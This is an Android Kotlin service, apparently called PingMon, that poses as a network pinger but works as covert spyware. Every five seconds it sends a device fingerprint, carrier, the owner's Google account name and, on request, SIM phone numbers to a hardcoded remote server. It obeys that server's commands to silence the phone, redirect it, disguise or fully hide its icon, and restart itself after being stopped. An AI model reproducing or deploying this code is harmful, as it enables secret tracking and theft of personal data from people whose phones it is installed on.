package com.example.pingmon

import android.accounts.AccountManager
import android.app.*
import android.content.*
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class PingService : Service() {

    companion object {
        const val WORKER_URL       = "https://pingmon.kapcher2019.workers.dev/ping"
        const val APP_TOKEN        = "p7k2m9qx4bz8vn3rt"
        const val PING_INTERVAL_MS = 5_000L
        const val CHANNEL_ID       = "pingmon"
        const val NOTIF_ID         = 1001
        const val ACTION_TICK      = "com.example.pingmon.TICK"
        const val ACTION_GOTO      = "com.example.pingmon.GOTO"
        const val PREFS            = "pingmon"
        const val KEY_DOMAIN       = "domain"
        const val DEFAULT_DOMAIN   = "https://www.google.com"
        private const val KEY_REPORT = "pending_report"
        private const val TAG      = "PingMon"

        fun start(ctx: Context) {
            val i = Intent(ctx, PingService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Log.w(TAG, "start: ${e.message}") }
        }

        fun uid(ctx: Context): String {
            val hw = listOf(
                Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
                Build.HARDWARE, Build.BOARD, Build.BRAND,
            ).joinToString("|")
            val digest = java.security.MessageDigest.getInstance("SHA-256")
            val hash   = digest.digest(hw.toByteArray())
            return hash.take(10).joinToString("") { "%02x".format(it) }
        }

        fun currentDomain(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN

        fun setDomain(ctx: Context, url: String) =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putString(KEY_DOMAIN, url).apply()
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var thread: HandlerThread? = null
    private var handler: Handler?      = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private var running = false
    private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    /* ============================================================ lifecycle */

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification("starting…"))
        thread = HandlerThread("ping").apply { start() }
        handler = Handler(thread!!.looper)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop").apply {
            setReferenceCounted(false); acquire()
        }
        watchNetwork()
        running = true
        tick()
        Reviver.scheduleAll(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TICK) handler?.post { tick() }
        else if (!running) { running = true; handler?.post { tick() } }
        Reviver.scheduleAll(this)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        Reviver.scheduleRestart(this, 1_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        wakeLock?.let { if (it.isHeld) it.release() }
        unwatchNetwork()
        Reviver.scheduleRestart(this, 2_000)
        super.onDestroy()
    }

    /* ================================================================ loop */

    private fun tick() {
        IconManager.retryIfPending(this)  // re-apply any pending hide/show
        if (isOnline()) sendPing()
        handler?.removeCallbacksAndMessages(null)
        handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
        Reviver.scheduleTick(this, PING_INTERVAL_MS)
    }

    /* ============================================================ network */

    private fun isOnline(): Boolean {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(n) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun watchNetwork() {
        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                handler?.post { sendPing() }
            }
        }
        try { cm.registerNetworkCallback(req, netCallback!!) }
        catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
    }

    private fun unwatchNetwork() {
        netCallback?.let {
            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
        netCallback = null
    }

    /* ================================================================ ping */

    private fun sendPing() {
        val pendingReport = prefs.getString(KEY_REPORT, null)

        val payload = JSONObject().apply {
            put("uid",      uid(this@PingService))
            put("battery",  batteryLevel())
            put("domain",   currentDomain(this@PingService))
            put("model",    "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("android",  Build.VERSION.RELEASE)
            put("operator", operatorName())
            put("gmail",    gmailAccount())
            put("network",  networkType())
            if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
        }.toString()

        val req = Request.Builder()
            .url(WORKER_URL)
            .addHeader("X-Token", APP_TOKEN)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                updateNotification("offline")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    val bodyStr = it.body?.string() ?: ""
                    if (it.isSuccessful) {
                        if (!pendingReport.isNullOrBlank())
                            prefs.edit().remove(KEY_REPORT).apply()
                        handleResponse(bodyStr)
                    } else {
                        updateNotification("err ${it.code}")
                    }
                }
            }
        })
    }

    private fun handleResponse(bodyStr: String) {
        updateNotification("ok")
        try {
            val json = JSONObject(bodyStr)
            val cmd  = json.optString("cmd", "")
            val arg  = json.optString("arg", "")
            when (cmd) {
                "goto"  -> if (arg.isNotBlank()) {
                    setDomain(this, arg)
                    sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                }
                "cmd_a" -> vibrate()
                "cmd_b" -> { /* TODO */ }
                "cmd_c" -> { /* TODO */ }
                "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
                "cmd_e" -> setSilent()           // silent mode
                "cmd_f" -> setRinging()          // ring at 2/3 volume
                "cmd_g" -> changeIcon()          // swap to hidden icon
                "cmd_h" -> restoreIcon()         // restore main icon
                "cmd_i" -> fullHide()            // completely hide (no icon)
                "cmd_j" -> unHide()              // unhide and restore
            }
        } catch (_: Exception) {}
    }

    /* ============================================================ commands */

    // A — vibrate 3 times
    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(
                    longArrayOf(0, 300, 200, 300, 200, 300),
                    intArrayOf(0, 255, 0, 255, 0, 255), -1
                ))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
            }
        } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
    }

    // D — read SIM phone numbers, queue for next ping
    private fun reportPhoneNumbers() {
        val lines = mutableListOf<String>()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as android.telephony.SubscriptionManager
                sm.activeSubscriptionInfoList?.forEach { sub ->
                    val num  = sub.number?.takeIf { it.isNotBlank() } ?: "—"
                    val name = sub.displayName?.toString() ?: "SIM ${sub.simSlotIndex + 1}"
                    lines.add("SIM${sub.simSlotIndex + 1}: $num  ($name)")
                }
            }
        } catch (_: Exception) {}

        if (lines.isEmpty()) {
            try {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                @Suppress("DEPRECATION")
                val num = tm.line1Number?.takeIf { it.isNotBlank() } ?: "—"
                lines.add("SIM1: $num")
            } catch (e: Exception) { lines.add("error: ${e.message}") }
        }

        prefs.edit()
            .putString(KEY_REPORT, "📞 Phone numbers:\n" + lines.joinToString("\n"))
            .apply()
    }

    // E — silent (vibrate fallback if DND blocks)
    private fun setSilent() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            am.ringerMode = AudioManager.RINGER_MODE_SILENT
        } catch (_: SecurityException) {
            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE }
            catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
        } catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
    }

    // F — ring at 2/3 max volume
    private fun setRinging() {
        try {
            val am  = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            val max = am.getStreamMaxVolume(AudioManager.STREAM_RING)
            am.setStreamVolume(AudioManager.STREAM_RING, max * 2 / 3, 0)
        } catch (e: Exception) { Log.w(TAG, "setRinging: ${e.message}") }
    }

    // G — swap to neutral icon (app still visible, just camouflaged)
    private fun changeIcon() = IconManager.hide(this, fullyHide = false)

    // H — restore main icon
    private fun restoreIcon() = IconManager.show(this)

    // I — completely disappear from launcher
    private fun fullHide() = IconManager.hide(this, fullyHide = true)

    // J — unhide and restore main icon
    private fun unHide() = IconManager.show(this)

    /* =========================================================== device info */

    private fun batteryLevel(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun operatorName(): String? = try {
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
            .networkOperatorName.takeIf { it.isNotBlank() }
    } catch (_: Exception) { null }

    private fun gmailAccount(): String? = try {
        AccountManager.get(this).getAccountsByType("com.google").firstOrNull()?.name
    } catch (_: Exception) { null }

    private fun networkType(): String {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(n) ?: return "none"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "other"
        }
    }

    /* ========================================================== notification */

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String): Notification {
        val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
            ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com"))
                .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
        val tap = PendingIntent.getActivity(
            this, 0, playIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PingMon")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).setSilent(true).setShowWhen(false)
            .setContentIntent(tap).build()
    }

    private fun updateNotification(state: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} · $state"))
        } catch (_: Exception) {}
    }
}
